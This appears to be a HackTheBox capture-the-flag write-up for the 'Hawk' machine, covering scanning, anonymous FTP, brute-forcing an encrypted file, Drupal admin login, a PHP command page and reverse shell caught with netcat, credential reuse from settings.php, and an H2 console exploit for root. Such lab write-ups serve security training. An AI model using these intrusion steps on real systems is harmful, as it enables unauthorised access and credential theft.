# HAWK

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ nmap 10.10.10.102
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 02:24 EDT
Nmap scan report for 10.10.10.102
Host is up (0.27s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 41.88 seconds
                                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ nmap 10.10.10.102 -p 21,22,80,8082 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 02:25 EDT
Nmap scan report for 10.10.10.102
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (530.2602 kB/s)
```

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ la
.drupal.txt.enc

┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ file .drupal.txt.enc 
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
                                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ cat .drupal.txt.enc                    
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```

On trying to decrypt it using openssl it prompts for a password.
I found this [openssl-bruteforce tool] to find the password.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk/openssl-bruteforce]
└─$ ./brute.py /usr/share/wordlists/rockyou.txt ciphers.txt ../.drupal.txt.enc                        1 ⨯
Running pid: 3105       Cipher: AES-128-CBC
Running pid: 3598       Cipher: AES-128-CFB
Running pid: 3608       Cipher: AES-128-CFB1
Running pid: 3618       Cipher: AES-128-CFB8
Running pid: 3628       Cipher: AES-128-CTR
Running pid: 3638       Cipher: AES-128-ECB
Running pid: 4245       Cipher: AES-128-OFB
Running pid: 4255       Cipher: AES-192-CBC
Running pid: 5700       Cipher: AES-192-CFB
Running pid: 5710       Cipher: AES-192-CFB1
Running pid: 5720       Cipher: AES-192-CFB8
Running pid: 5730       Cipher: AES-192-CTR
Running pid: 5740       Cipher: AES-192-ECB
Running pid: 6218       Cipher: AES-192-OFB
Running pid: 6228       Cipher: AES-256-CBC
--------------------------------------------------
Password found with algorithm AES-256-CBC: friends
Data: 
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

We have credentials now `daniel:PencilKeyboardScanner123`

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/hawk1.png)

I tried to login using the creds we found but they didn't work.
The creds that worked are `admin:PencilKeyboardScanner123`

![](https://github.com/Leo-2807/Writeups/blob/main/images/hawk3.png)

## SHELL

While enumerating the portal I found this php filter module disabled so I enabled it and then saved the configuration.

![](https://github.com/Leo-2807/Writeups/blob/main/images/hawk4.png)

![](https://github.com/Leo-2807/Writeups/blob/main/images/hawk5.png)

Then clicking on `Add content` and `Basic page` we can create a page.
Change the page type to `php code` , write the code and save it.

![](https://github.com/Leo-2807/Writeups/blob/main/images/hawk6.png)

Use this url `http://10.10.10.102/node/1?cmd=whoami#`

![](https://github.com/Leo-2807/Writeups/blob/main/images/hawk7.png)

The same way I make another page but this time I copy the `php reverse shell` on it.As soon as I save it I get a shell on my machine.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk/openssl-bruteforce]
└─$ nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.102] 57568
Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 08:03:39 up  1:26,  0 users,  load average: 0.01, 0.00, 2.60
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hawk:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On checking I find that we have read permission for user.txt

```bash
www-data@hawk:/$ ls /home
ls /home
daniel
www-data@hawk:/$ ls -la /home/daniel
ls -la /home/daniel
total 36
drwxr-xr-x 5 daniel daniel 4096 Jul 27 15:25 .
drwxr-xr-x 3 root   root   4096 Jun 16  2018 ..
lrwxrwxrwx 1 daniel daniel    9 Jul  1  2018 .bash_history -> /dev/null
drwx------ 2 daniel daniel 4096 Jul 27 15:25 .cache
drwx------ 3 daniel daniel 4096 Jun 12  2018 .gnupg
-rw------- 1 daniel daniel  136 Jun 12  2018 .lesshst
-rw------- 1 daniel daniel  342 Jun 12  2018 .lhistory
drwx------ 2 daniel daniel 4096 Jun 12  2018 .links2
lrwxrwxrwx 1 daniel daniel    9 Jul  1  2018 .python_history -> /dev/null
-rw------- 1 daniel daniel  814 Jun 12  2018 .viminfo
-rw-r--r-- 1 daniel daniel   33 Oct 22 06:37 user.txt
www-data@hawk:/$ cat /home/daniel/user.txt
cat /home/daniel/user.txt
23ea5bb1ce81dd1adfd8bb2fd4aeb73e
```

## PRIVESEC

Since we already know the username is `daniel` so I tried to find password in the html directory.

```bash
www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep password
cat settings.php | grep password
 *   'password' => 'password',
 * username, password, host, and database name.
 *   'password' => 'password',
 *   'password' => 'password',
 *     'password' => 'password',
 *     'password' => 'password',
      'password' => 'drupal4hawk',
 * by using the username and password variables. The proxy_user_agent variable
# $conf['proxy_password'] = '';
```

This password worked and I was able to ssh as daniel.
`daniel:drupal4hawk`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/hawk]
└─$ ssh daniel@10.10.10.102
daniel@10.10.10.102's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 22 08:28:22 UTC 2021

  System load:  0.08              Processes:           171
  Usage of /:   48.1% of 7.32GB   Users logged in:     0
  Memory usage: 64%               IP address for eth0: 10.10.10.102
  Swap usage:   23%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.


Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty;pty.spawn("/bin/bash")
daniel@hawk:~$ 
```

Running linenum I find that the h2 sever on port 8082 is running as root.

On googling for h2 exploit I found the following [exploit](https://www.exploit-db.com/exploits/45506).

I downloaded the script and transfered it to the victim machine usinh python http server and wget command.

On running the script it gave me a root shell.

```bash
daniel@hawk:/dev/shm$ python3 h2.py -H 127.0.0.1:8082
[*] Attempting to create database
[+] Created database and logged in
[*] Sending stage 1
[+] Shell succeeded - ^c or quit to exit
h2-shell$ whoami
root

h2-shell$ cat /root/root.txt
99a9cae2ff6588d137067c8b6e0785b3
```